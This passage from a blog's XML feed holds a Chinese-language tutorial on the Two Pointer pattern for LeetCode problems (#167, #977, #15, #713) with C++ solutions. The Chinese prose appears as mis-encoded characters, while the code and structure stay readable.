å¦‚æœä½ å°é€™å€‹ pattern æœ‰èˆˆè¶£ï¼Œå¯ä»¥å†å»çœ‹çœ‹å»¶ä¼¸é–±è®€çš„ç­†è¨˜ï¼Œè£¡é¢è¨˜éŒ„äº†ä¸å°‘ Sliding Window çš„é¡Œç›®ï¼Œè€Œä¸”å¾ç°¡å–®åˆ°è¶Šä¾†è¶Šé›£ï¼Œå¦‚æœæŠŠé€™äº›é¡Œç›®ä¸€æ¬¡å¯«å®Œï¼Œå°æ–¼ Sliding Window çš„æŒæ¡åº¦æ‡‰è©²å°±å¤§å¤§æå‡äº†ï¼
å»¶ä¼¸é–±è®€
æˆ‘çš„ Leetcode åˆ·é¡Œç­†è¨˜ - Sliding Window pattern

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode åˆ·é¡Œ pattern - Two Pointer</title>
    <url>/2019/08/30/leetcode-pattern-two-pointer/</url>
    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œæœ‰è¶Šä¾†è¶Šå¤šäººæŠ•å…¥åˆ·é¡Œçš„è¡Œåˆ—ï¼Œåœ¨çœ¼èŠ±æ’©äº‚çš„é¡Œæµ·ä¸­ï¼Œè¦æƒ³æœ‰æ•ˆç‡åœ°åˆ·é¡Œï¼ŒæŒæ¡ä¸¦é€šé”é¡Œç›®è§£æ³•èƒŒå¾Œï¼Œå¯ä»¥ä¸æ–·è¢«æ‹¿ä¾†ä½¿ç”¨çš„è§€å¿µï¼Œæ‰èƒ½åšåˆ°ä»¥ç°¡ç¦¦ç¹ã€‚
ä»Šå¤©å°±è¦è·Ÿå¤§å®¶ä»‹ç´¹ä¸€ç¨®æ¼”ç®—æ³•çš„ pattern - Two Pointerã€‚
Two Pointer çš„ç¬¬ä¸€å€‹ç¯„ä¾‹ - Leetcode #167 Two Sum IIé¡Œç›®æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹é¡Œç›®çš„æ•˜è¿°ï¼š

è¼¸å…¥æ˜¯ä¸€å€‹ arrayï¼Œè£¡é¢æ˜¯å·²ç¶“æ’å¥½åºçš„ intï¼Œå‰©ä¸‹å°±æ˜¯è¦æ‰¾åˆ°åŠ ç¸½èµ·ä¾†ç­‰æ–¼ target çš„ä¸€çµ„ indexã€‚
æš´åŠ›æ³•æœ€æœ€æœ€ç›´è¦ºçš„æš´åŠ›æ³•ï¼Œå°±æ˜¯æ¯ä¸€çµ„æ­é…éƒ½è©¦è©¦çœ‹ï¼Œæ‰€ä»¥ pseudo code æœƒåƒä¸‹é¢é€™æ¨£ï¼š
For every i in numbers start from index 0:  For every j in numbers start from index i+1:    If(numbers[i]+numbers[j] equals to target)      Return i&amp;j    Endif  EndforEndfor

å¦‚æœ array çš„é•·åº¦æ˜¯ nï¼Œé‚£æ™‚é–“è¤‡é›œåº¦å°±æ˜¯ $O(n^2)$ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœä½ çš„å­—ä¸²é•·åº¦æ˜¯ 1,000ï¼Œæœ€ç³Ÿå¾—è·‘é€™å€‹è¿´åœˆ 1,000,000 æ¬¡(é€™é‚Šæ˜¯ç²—ç®—ï¼Œç•¶ç„¶ä¸ç”¨é‚£éº¼å¤šï¼Œå› ç‚º j æ˜¯å¾ i+1 é–‹å§‹ï¼Œåªæ˜¯æŠ“å€‹å¤§æ¦‚)ï¼
å¥½ä¸€é»çš„è§£æ³• - Hash Tableæœ‰å¯«é Leetcode å¤©å­—ç¬¬ä¸€é¡Œ Two Sum çš„æœ‹å‹ä¸€å®šå¾ˆç›´è¦ºæƒ³åˆ°ï¼Œè¦é¿å… $O(n^2)$ é‚„ä¸ç°¡å–®ï¼Œç”¨å€‹ Hash Table å°±å¥½äº†å˜›ã€‚ï¼ˆå¦‚æœä½ ä¸çŸ¥é“åœ¨èªªä»€éº¼ï¼Œå¯ä»¥çœ‹çœ‹ ä¹‹å‰å¯«éçš„é€™ç¯‡æ–‡ç« ï¼‰
æ²’éŒ¯ï¼å¦‚æœç”¨ Hash Tableï¼Œç¢ºå¯¦å¯ä»¥è®“æ™‚é–“è¤‡é›œåº¦é™åˆ° $O(n)$ï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œå¦‚æœä½ çš„ array é•·åº¦æ˜¯ 1,000ï¼Œä½ åªéœ€è¦è·‘ 1,000 å€‹è¿´åœˆï¼Œå‡è¨­ä½ è‡ªå·±æ˜¯é›»è…¦è£¡é¢çš„ CPU å°ç²¾éˆï¼ˆ?ï¼‰ï¼Œè¦è² è²¬è·‘è¿´åœˆï¼Œä½ å¾éœ€è¦è·‘ 1,000,000 åœˆåˆ°è®Šæˆåªè¦è·‘ 1,000 åœˆï¼Œæ˜¯ä¸æ˜¯æœƒè¬å¤©è¬åœ°è¬ä¸Šå¸ï¼¸ï¼¤
ä¸éå¦‚æœä½ æ˜¯è¨˜æ†¶é«”å°ç²¾éˆï¼ˆ?ï¼‰ï¼Œä½ å¯èƒ½æœƒè¦ºå¾—å¾ˆç…©ï¼Œå‰›å‰›æ˜æ˜åªæœ‰ CPU å°ç²¾éˆè¦è·‘ 1,000,000 åœˆï¼Œä½ æ­£æƒ³èªªè¶ä»–åœ¨è·‘ï¼Œä½ è¦å»è·‘ UberEatsï¼Œçµæœç¾åœ¨ä½ ä¹Ÿå¤šäº† 1,000 å€‹æ±è¥¿ï¼ˆæœ€å¤šï¼‰è¦ç®¡ç†ã€‚ä½ å¯èƒ½æƒ³èªªï¼Œèƒ½ä¸èƒ½å†æƒ³æƒ³ï¼ä¸è¦å› ä½ çš„æ‡¶æƒ°å«æˆ‘å¤šåšäº‹ï¼
Two Pointer è§£æ³•è½åˆ°äº†è¨˜æ†¶é«”å°ç²¾éˆçš„å‘¼å–šï¼ŒTwo Pointer æ¼”ç®—æ³•å‡ºä¾†æ•‘æ´äº†ã€‚åœ¨é€™é¡Œä¸­æœ‰å€‹å¾ˆå·§å¦™çš„æ€§è³ªï¼Œå°±æ˜¯ array è£¡é¢çš„æ±è¥¿æ˜¯æ’å¥½åºçš„ï¼Œå¦‚æœåªèƒ½ç”¨è·Ÿ Two Sum ä¸€æ¨£çš„è§£æ³•ï¼Œå¹¹å˜›è¦å¤šçµ¦æ’åºå¥½çš„é€™å€‹å¤§ç‰¹æƒ ï¼Ÿ
æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ç¯„ä¾‹ï¼š
numbers = [2,7,11,15]target = 9

å…ˆæƒ³æƒ³ï¼Œå¦‚æœæˆ‘ç”¨å·¦å³æ‰‹å…©æ ¹é£ŸæŒ‡ï¼Œå·¦æ‰‹æŒ‡å‘ 2ï¼Œå³æ‰‹æŒ‡å‘ 15ï¼Œé€™æ™‚å…©æ ¹æ‰‹æŒ‡çš„æ•¸å­—åŠ èµ·ä¾†æ˜¯ 17ï¼Œæ¯” 9 é‚„å¤§ï¼Œé€™è¡¨ç¤ºä»€éº¼ï¼Ÿæ˜¯å·¦æ‰‹æŒ‡çš„æ•¸å­—æœ‰å•é¡Œå—ï¼Ÿ
è‚¯å®šä¸æ˜¯å•Šï¼Œå› ç‚º array å·²ç¶“æ’éåºäº†ï¼Œå·¦æ‰‹æŒ‡å‘çš„ 2 æ˜¯æœ€å°çš„ï¼Œæˆ‘å€‘å¸Œæœ›å…©æ ¹æ‰‹æŒ‡åŠ èµ·ä¾†çš„æ•¸å­—ç­‰æ–¼ 9ï¼Œä¹Ÿå°±æ˜¯èªªå³æ‰‹æŒ‡çš„æ•¸å­—å¤ªå¤§äº†ï¼
æ‰€ä»¥æ¥ä¸‹ä¾†æˆ‘å€‘æœƒï¼š

æŠŠå³æ‰‹å¾€å·¦ç§»ï¼ŒæŒ‡å‘ 11; é€™æ™‚ 2+11 &#x3D;&#x3D; 13 é‚„æ˜¯æ¯” 9 å¤§
æŠŠå³æ‰‹å†å¾€å·¦ç§»ï¼ŒæŒ‡å‘ 7; é€™æ™‚ 2+7 &#x3D;&#x3D; 9ï¼Œæ‰¾åˆ°äº†ï¼

æƒ³ä¸åˆ°å‹•å…©æ ¹æ‰‹æŒ‡å°±å¯ä»¥é€™éº¼å¿«æ‰¾åˆ°ï¼é€™å°±æ˜¯ Two Pointer çš„é­…åŠ›ï¼Œé€™å€‹æ¼”ç®—æ³•çš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n)$ï¼Œç©ºé–“è¤‡é›œåº¦æ˜¯ $O(1)$ï¼ˆä¸ç®¡å­—ä¸²æœ‰å¤šé•·ï¼Œæˆ‘éƒ½åªéœ€è¦å…©æ ¹æ‰‹æŒ‡å•¦ï¼ï¼‰ã€‚
class Solution &#123;public:  vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) &#123;    if(nums.size() &lt; 2) return &#123;&#125;;    int l = 0, r = nums.size()-1;        while(l &lt;= r) &#123;      if(nums[l] + nums[r] == target) &#123;        // index start from 1, so we need to add 1        return &#123;l+1, r+1&#125;;      &#125;      else if(nums[l] + nums[r] &gt; target) r--;      else if(nums[l] + nums[r] &lt; target) l++;    &#125;        return &#123;&#125;;  &#125;&#125;;

çœ‹åˆ°é€™é‚Šæ˜¯ä¸æ˜¯åˆæ­¥é«”é©—åˆ° Two Pointer çš„å²å®³äº†å‘¢ï¼Œä¸éé€™å€‹ pattern å¦‚æœåªæœ‰ä¸€é¡Œé©ç”¨ï¼Œé‚£å°±ä¸ç”¨ç‰¹åˆ¥è¬›äº†ï¼Œè®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ã€‚
Two Pointer çš„ç¬¬äºŒå€‹ç¯„ä¾‹ - Leetcode #977 Squares of a Sorted Arrayé¡Œç›®é€™ä¸€é¡Œçš„æ•˜è¿°åœ¨é€™ï¼š

æš´åŠ›æ³•é€™é¡Œçš„æš´åŠ›æ³•æ‡‰è©²å¾ˆç›´è§€ï¼Œæˆ‘å€‘å…ˆæŠŠæ¯ä¸€å€‹ element çš„å¹³æ–¹æ•¸éƒ½ç®—å‡ºä¾†ï¼Œå­˜åœ¨åŸæœ¬çš„ arrayï¼Œç„¶å¾Œ sort é€™å€‹ array å°±å¥½ã€‚é€™æ¨£å­çš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(nlogn)$ï¼Œä½†é€™æ™‚æˆ‘å€‘è¦å• - Can we do betterï¼Ÿ
ç­”æ¡ˆæ˜¯ Yes, I do we canï¼
Two Pointer è§£æ³•Two Pointer çš„è§£æ³•è·Ÿä¸Šä¸€é¡Œçš„ç²¾ç¥æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œé¦–å…ˆï¼Œæˆ‘å€‘è¦æ³¨æ„åˆ°é€™é¡Œçš„è¼¸å…¥æ˜¯ä¸€å€‹ non-decreasing arrayï¼Œä¹Ÿå°±æ˜¯ç­‰æ–¼å·²ç¶“æ’å¥½åºå•¦ï¼æ‰€ä»¥ï¼Œæˆ‘å€‘ä¸€æ¨£å¯ä»¥ç”¨å·¦å³æ‰‹å…©æ ¹é£ŸæŒ‡ï¼Œå·¦æ‰‹æŒ‡åˆ°æœ€å‰é¢ï¼Œå³æ‰‹æŒ‡åˆ°æœ€å¾Œé¢ï¼Œç„¶å¾Œé–‹å§‹æ¯”è¼ƒã€‚
å”¯ä¸€ä¸€å€‹ä¸ä¸€æ¨£çš„åœ°æ–¹æ˜¯ï¼ŒåŸæœ¬çš„ array ä¸­æœ‰è² æ•¸ï¼Œä½†æ—¢ç„¶å·²ç¶“æ’å¥½åºï¼Œæˆ‘å€‘åªè¦æ¯”è¼ƒå…©é‚Šçš„å¹³æ–¹æ•¸å°±å¥½ï¼Œçœ‹å€‹ç¯„ä¾‹å§ï¼š
numbers = [-4,-1,0,3,10]

åˆå§‹åŒ–ï¼Œæ‹¿å‡ºä½ çš„æ‰‹æŒ‡ï¼Œå·¦æ‰‹æŒ‡å‘ -4ï¼Œå³æ‰‹æŒ‡å‘ 10ï¼Œé€™æ™‚å…©æ ¹æ‰‹æŒ‡çš„å¹³æ–¹æ•¸åˆ†åˆ¥æ˜¯ 16 è·Ÿ 100ï¼Œå› ç‚º 100 æ¯”è¼ƒå¤§ï¼Œæ‰€ä»¥æˆ‘å€‘æŠŠå®ƒæ”¾åˆ°ç­”æ¡ˆ array çš„å°¾ç«¯ã€‚
ç„¶å¾Œæ¥ä¸‹ä¾†å¤§å®¶å¤§æ¦‚éƒ½æœƒäº†ï¼š

æŠŠå³æ‰‹å¾€å·¦ç§»ï¼ŒæŒ‡å‘ 3; é€™æ™‚ 16 &gt; 9ï¼ŒæŠŠ 16 æ”¾åˆ°ç­”æ¡ˆ array çš„å°¾ç«¯ - 1 çš„ä½ç½®
æŠŠå·¦æ‰‹å¾€å³ç§»ï¼ŒæŒ‡å‘ -1; é€™æ™‚ 9 &gt; 1ï¼ŒæŠŠ 9 æ”¾åˆ°ç­”æ¡ˆ array çš„å°¾ç«¯ - 2 çš„ä½ç½®
æŠŠå³æ‰‹å¾€å·¦ç§»ï¼ŒæŒ‡å‘ 0; é€™æ™‚ 1 &gt; 0ï¼ŒæŠŠ 1 æ”¾åˆ°ç­”æ¡ˆ array çš„å°¾ç«¯ - 3 çš„ä½ç½®
æŠŠå·¦æ‰‹å¾€å³ç§»ï¼ŒæŒ‡å‘ 0ï¼›é€™æ™‚å…©é‚ŠæŒ‡çš„éƒ½ä¸€æ¨£ï¼Œç›´æ¥æŠŠ 0 æ”¾åˆ°ç­”æ¡ˆ array çš„å°¾ç«¯ - 4 çš„ä½ç½®

æ˜¯ä¸æ˜¯ä¹Ÿå¾ˆç°¡å–®å‘¢ï¼Ÿè€Œä¸”æ™‚é–“è¤‡é›œåº¦å°±é™åˆ° $O(n)$ äº†ã€‚
é€™æ™‚å†çœ‹å€‹ codeï¼Œè¦ºå¾—æ£’ï¼š
class Solution &#123;public:  vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; arr) &#123;    int n = arr.size();    vector&lt;int&gt; squares(n);        int highestIdx = n-1;    int l=0, r=n-1;    while(l &lt;= r) &#123;      int leftSquare = pow(arr[l], 2);      int rightSquare = pow(arr[r], 2);            if(leftSquare &gt;= rightSquare) &#123;        squares[highestIdx--] = leftSquare;        l++;      &#125;      else &#123;        squares[highestIdx--] = rightSquare;        r--;      &#125;    &#125;        return squares;  &#125;&#125;;

Two Pointer çš„ç¬¬ä¸‰å€‹ç¯„ä¾‹ - Leetcode #15 3Sumé¡Œç›®
æš´åŠ›æ³•ä¸€æ¨£ï¼Œæˆ‘å€‘å…ˆä¸Šæœ€ç›´è¦ºçš„æš´åŠ›æ³•ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸€çµ„æ­é…éƒ½è©¦è©¦çœ‹ï¼Œpseudo code æœƒåƒä¸‹é¢é€™æ¨£ï¼š
ans = empty arrayFor every i in nums start from index 0:  For every j in nums start from index i+1:    For every k in nums start from index j+1:      If(nums[i]+nums[j]+nums equals to 0)        Add &#123;nums[i], nums[j], nums[k]&#125; to the ans      Endif    Endfor  EndforEndforreturn ans

å¦‚æœ array çš„é•·åº¦æ˜¯ nï¼Œé‚£æ™‚é–“è¤‡é›œåº¦å°±æ˜¯ $O(n^3)$ã€‚
Two Pointer è§£æ³•å¯«åˆ°é€™é‚Šï¼Œå»¢è©±å°±ä¸å¤šèªªï¼Œæˆ‘å€‘å°±ä¾†çœ‹çœ‹æ€éº¼å„ªåŒ–ã€‚é¦–å…ˆä»”ç´°è§€å¯Ÿä¸€ä¸‹é¡Œç›®ï¼Œé€™é¡Œçš„è¼¸å…¥æ˜¯ä¸€å€‹æ²’æœ‰ sort éçš„ arrayï¼Œé€™æ™‚å¿ƒè£å¯èƒ½æœƒæƒ³èªª GG æ€å¯†é”ï¼Œçœ‹ä¾†æ‡‰è©²æ˜¯æ²’ Two Pointer çš„æˆ²äº†ã€‚
ä½†ï¼Œæˆ‘å€‘æ˜¯ç¨‹å¼è¨­è¨ˆå¸«ï¼Œè¼¸å…¥æ²’æœ‰ sort é›£é“æˆ‘å€‘ä¸èƒ½è‡ªå·± sort å—ï¼Ÿç•¶ç„¶å¯ä»¥ï¼Œå¯æ˜¯è¦æ³¨æ„ä¸€ä»¶äº‹ï¼Œå¦‚æœæˆ‘å€‘è¦è¼¸å‡ºçš„ç­”æ¡ˆæ˜¯ indexï¼Œé‚£å°±éº»ç…©äº†ã€‚ä¸éå¾ˆå¹¸é‹åœ°ï¼Œæˆ‘å€‘è¦è¼¸å‡ºçš„æ˜¯æ•¸å€¼ï¼ï¼ˆé€™é‚Šå°±ç™¼ç¾é¡Œç›®è¨­è¨ˆè€…å¯èƒ½ï¼Œå°±æ˜¯ï¼Œå·å·åœ°æƒ³è¦è®“ä½ å¯ä»¥ sortï¼‰
æ‰€ä»¥æˆ‘å€‘å¯ä»¥å…ˆæŠŠè¼¸å…¥çš„ array sort å®Œï¼Œç„¶å¾Œä¾åºæŠŠæ¯å€‹ element ç•¶ä½œ nums[i]ï¼Œå‰©ä¸‹å°±æ˜¯å°‹æ‰¾ nums[j]+nums[k] &#x3D;&#x3D; -nums[i]ã€‚æ­å–œæ­å–œï¼Œè®Šå›å‰›å‰›å­¸éçš„ #167 äº†ã€‚
è®“æˆ‘å€‘å¯¦ä½œå‡ºä¸‹é¢çš„ç¨‹å¼ç¢¼ï¼š
class Solution &#123;public:  vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123;    vector&lt;vector&lt;int&gt;&gt; triplets;    int n = nums.size();        sort(nums.begin(), nums.end());    // Note:    // 1. Iterate to n-2 only    // 2. Need to skip same element to avoid duplicate triplets    for(int i=0; i&lt;n-2; i++) &#123;      // skip same element to avoid duplicate triplets      if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) &#123;        continue;      &#125;            searchPair(nums, -nums[i], i+1, triplets);    &#125;        return triplets;  &#125;private:  void searchPair(vector&lt;int&gt;&amp; nums, int target, int start, vector&lt;vector&lt;int&gt;&gt;&amp; triplets) &#123;    int l=start, r=nums.size()-1;    while(l&lt;r) &#123;      if(nums[l]+nums[r] == target) &#123;        triplets.push_back(&#123;-target, nums[l], nums[r]&#125;);                // Intuitively, we should only do l++ or r--        // so that we won&#x27;t miss the case of nums[l]+nums[r-1] or nums[l+1]+nums[r]        // But think deeper, if we only do r--        // After preventing duplicates, we know that        // nums[l] and nums[new r] cannot fulfill sum==target        // So we won&#x27;t miss anything even we do l++ and r--        l++;        r--;                while (l &lt; r &amp;&amp; nums[l] == nums[l-1]) &#123;          l++; // skip same element to avoid duplicate triplets        &#125;                while (l &lt; r &amp;&amp; nums[r] == nums[r+1]) &#123;          r--; // skip same element to avoid duplicate triplets        &#125;      &#125;      else if(nums[l]+nums[r] &gt; target) r--;      else if(nums[l]+nums[r] &lt; target) l++;    &#125;  &#125;&#125;;

åœ¨å¯¦ä½œåˆ°ç¨‹å¼éšæ®µæœƒæœ‰æ¯”è¼ƒå¤šçš„å°ç´°ç¯€è¦æ³¨æ„ï¼Œä¸éæ•´é«”æ€æƒ³å…¶å¯¦ç›¸ç•¶ç°¡å–®ã€‚
3Sum çš„å°å»¶ä¼¸å¦‚æœé€™é¡Œä½ æ‡‚äº†ï¼Œä¹Ÿå¯ä»¥å†å»å¯«ä¸€å¯« #16 - 3Sum Closestã€# 259 - 3Sum Smallerï¼Œæ¯æ¬¡å¯«ä¹Ÿå¯ä»¥æƒ³æƒ³å¦‚æœä½ ç”¨æš´åŠ›è§£ï¼Œæ¼”ç®—æ³•çš„æ•ˆç‡æœƒå·®å¤šå°‘ï¼Œä½ å°±æœƒè¶Šä¾†è¶Šæ¬£è³ Two Pointer å›‰ï¼
è€Œä¸”ï¼Œå­¸æœƒä¸€å€‹æŠ€å·§å°±å¯ä»¥æ‰“æ‰ 3 é¡Œ leetcode é¡Œæ˜¯ä¸æ˜¯æœ‰é»é–‹å¿ƒï¼¸ï¼¤
Two Pointer çš„ç¬¬å››å€‹ç¯„ä¾‹ - Leetcode #713 Subarray Product Less Than Ké¡Œç›®
æš´åŠ›æ³•é€™é¡Œçš„æš´åŠ›æ³•ä¹Ÿå¾ˆç›´è¦ºï¼Œåˆ—èˆ‰å‡ºæ‰€æœ‰çš„ subarray å°±å°äº†ï¼åˆ—èˆ‰å‡ºæ¯å€‹ subarray å¾Œï¼Œéƒ½æŠŠé‚£å€‹ subarray çš„ element ä¹˜èµ·ä¾†ï¼Œçœ‹æœƒä¸æœƒæ¯” k å¤§ã€‚ä¸éé€™æ¨£åšçš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n^3)$ï¼Œå› ç‚ºè¦æœå°‹æ¯å€‹èµ·çµ‚é»ä½ç½®çš„çµ„åˆå°±å·²ç¶“è¦èŠ± $O(n^2)$ æ™‚é–“ï¼Œç„¶å¾Œæ¯ä¸€å€‹ subarray è¦èŠ± $O(n)$ çš„æ™‚é–“è¨ˆç®—ä¹˜ç©ï¼Œæ•´å€‹å°±éå¸¸æ‹–ã€‚
Two Pointer è§£æ³•å¦‚æœæˆ‘å€‘ä½¿ç”¨ Two Pointer ä¾†å½¢æˆä¸€å€‹ sliding windowï¼Œå°±èƒ½å¤ é€²ä¸€æ­¥åœ°ç¯€çœæ™‚é–“ï¼ŒåŸºæœ¬çš„æƒ³æ³•æ˜¯è¦é¿å…ï¼š

æ¯æ¬¡éƒ½å¾—é‡æ–°å– Window
æ¯æ¬¡éƒ½å¾—é‡æ–°ä¹˜ç©

è®“æˆ‘å€‘å…ˆçœ‹ä¸€å€‹ä¾‹å­ï¼š
nums = [10, 5, 2, 6]k = 100


product ä¸€é–‹å§‹æ˜¯ 1ï¼Œans ä¸€é–‹å§‹æ˜¯ 0ã€‚
å‡è¨­ä¸€é–‹å§‹å·¦æ‰‹æŒ‡å‘ 10ï¼Œå³æ‰‹ä¹ŸæŒ‡å‘ 10ï¼Œé€™æ™‚å€™ product *&#x3D; 10 &#x3D;&#x3D; 10ï¼Œæ‰€ä»¥æˆ‘å€‘çŸ¥é“å¯ä»¥æŠŠ ans +&#x3D; 1 &#x3D;&#x3D; 1ã€‚
æŠŠå³æ‰‹æŒ‡å¾€å³ç§»ï¼Œå³æ‰‹æŒ‡å‘ 5ï¼Œé€™æ™‚å€™ product *&#x3D; 5 &#x3D;&#x3D; 50ï¼Œå› ç‚ºä¾ç„¶å°æ–¼ kï¼Œæ‰€ä»¥æˆ‘å€‘çŸ¥é“ [10, 5] è·Ÿ [5] é€™å…©å€‹ subarray çš„ä¹˜ç©éƒ½å°æ–¼ kã€‚ æ‰€ä»¥å¯ä»¥æŠŠ ans +&#x3D; (r-l+1) &#x3D;&#x3D; 1 + (1-0+1) &#x3D;&#x3D; 3ã€‚ï¼ˆr è¡¨ç¤ºå³æ‰‹æŒ‡ä½ç½®ï¼Œl å‰‡è¡¨ç¤ºå·¦æ‰‹æŒ‡ä½ç½®ï¼‰

ä¾æ­¤é¡æ¨ï¼Œæ¥è‘—æŠŠå³æ‰‹å¾€å³ç§»ï¼Œå¦‚æœ product &gt; kï¼Œé‚£å°±å¾—æŠŠ product &#x2F;&#x3D; å·¦æ‰‹æŒ‡å‘çš„å€¼ï¼Œä¸¦æŠŠå·¦æ‰‹å¾€å³ç§»ï¼Œç›´åˆ° product &lt; kï¼Œé€™æ™‚å°±åˆå¯ä»¥å†æŠŠ ans +&#x3D; (r-l+1)ã€‚ç•¶å³æ‰‹æŒ‡è¶…é array ç¯„åœå°±ç®—å®Œäº†ã€‚
æ‰€ä»¥è¦é¿å…æš´åŠ›æ³•å†—é¤˜éƒ¨åˆ†çš„æ–¹æ³•å°±æ˜¯ï¼š

é¿å…æ¯æ¬¡éƒ½å¾—é‡æ–°å– Windowï¼šç•¶ç™¼ç¾æŸå€‹ subwindow çš„ä¹˜ç©æ¯” k å°æ™‚ï¼Œå°±çŸ¥é“å¯ä»¥ç›´æ¥åŠ ä¸Š r-l+1 å€‹ subarray
é¿å…æ¯æ¬¡éƒ½å¾—é‡æ–°ä¹˜ç©ï¼šç§»å‹•å³æ‰‹æŒ‡æ™‚ï¼Œproduct *= nums[r]ï¼›ç§»å‹•å·¦æ‰‹æŒ‡æ™‚ï¼Œproduct \= nums[l]

ç¨‹å¼ç¢¼éå¸¸ç°¡æ½”ï¼š
class Solution &#123;public:  int numSubarrayProductLessThanK(vector&lt;int&gt;&amp; nums, int k) &#123;    if(k &lt;= 1) return 0;    int n=nums.size();        int count = 0, product = 1, l = 0;    for(int r=0; r&lt;n; r++) &#123;      product *= nums[r];            while(product &gt;= k) &#123;        product /= nums[l];        l++;      &#125;            count += r-l+1;    &#125;        return count;  &#125;&#125;;

ç”¨ Two Pointer æ§‹æˆä¸€å€‹ Sliding window çš„è©±ï¼Œå°±åªéœ€è¦ $O(n)$ çš„æ™‚é–“å›‰ï¼å·®è¶…å¤šï¼
ç¸½çµç•¶æˆ‘å€‘åœ¨è™•ç† sorted array æˆ– sorted linked listï¼Œè€Œä¸”éœ€è¦æ‰¾åˆ°ä¸€çµ„æ»¿è¶³ç‰¹å®šæ¢ä»¶çš„ element æ™‚ï¼Œå°±å¾ˆå¯èƒ½å¯ä»¥ä½¿ç”¨ Two pointer ä¾†åŠ å¿«é€Ÿåº¦ã€‚
ä¸€çµ„ element å¯ä»¥æ˜¯ï¼š

ä¸€å€‹ pair
3 å€‹ element
ä¸€å€‹ subarray

ä¸Šé¢çš„å¹¾å€‹ä¾‹å­åˆ†åˆ¥å°æ‡‰åˆ°

ä¸€å€‹ pairï¼š#167
3 å€‹ elementï¼š#15
ä¸€å€‹ subarrayï¼š#713

å¸Œæœ›å¤§å®¶çœ‹å®Œä¹‹å¾Œï¼Œå¯ä»¥æ„Ÿå—åˆ° Two Pointer çš„æ–¹ä¾¿å’Œæ•ˆç‡ã€‚é«”é©—åˆ°é€™å€‹æ¼”ç®—æ³•å¥½ç”¨ã€å²å®³ï¼Œæ‰æœƒåœ¨è©²ç”¨çš„æ™‚å€™ï¼Œè‡ªç„¶è€Œç„¶åœ°ä½¿ç”¨ï¼Œæ¯”èµ·ç”¨èƒŒçš„ï¼ˆä¾‹å¦‚çœ‹åˆ°â€¦ï¼Œå°±è¦ç”¨â€¦ï¼‰ï¼Œæˆ‘è¦ºå¾—å»é«”é©—é€šé”å„ç¨®è§£æ³•ï¼Œè¦ºå¾—é…·åˆ°ä¸è‡ªè¦ºç¬‘å‡ºä¾†ã€æ„Ÿå—åˆ°è®šè®šè®šï¼Œå¯èƒ½å°±æ˜¯è®“æ¼”ç®—æ³•åŠŸåŠ›é€²åˆ°ä¸‹ä¸€å€‹å¢ƒç•Œçš„ç¾è±¡ã€‚
ä¸Šé¢æä¾›çš„å››é¡Œæ˜¯è®“å¤§å®¶åˆæ­¥é«”æœƒä¸€ä¸‹ Two Pointer çš„å¨åŠ›ï¼Œå¦‚æœä½ å°é€™å€‹ pattern æœ‰èˆˆè¶£ï¼Œå¯ä»¥å†å»çœ‹çœ‹å»¶ä¼¸é–±è®€çš„ç­†è¨˜ï¼Œè£¡é¢è¨˜éŒ„äº† 12 é¡Œ Two Pointer çš„é¡Œç›®ï¼Œè€Œä¸”å¾ç°¡å–®åˆ°è¶Šä¾†è¶Šé›£ï¼Œå¦‚æœæŠŠé€™äº›é¡Œç›®ä¸€æ¬¡å¯«å®Œï¼Œå°æ–¼ Two Pointer çš„æŒæ¡åº¦æ‡‰è©²å°±å¤§å¤§æå‡äº†ï¼
å»¶ä¼¸é–±è®€
æˆ‘çš„ Leetcode åˆ·é¡Œç­†è¨˜ - Two Pointer pattern

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode åˆ·é¡Œ pattern - Breadth-First Search</title>
    <url>/2019/12/21/leetcode-%E5%88%B7%E9%A1%8C-pattern-breadth-first-search/</url>
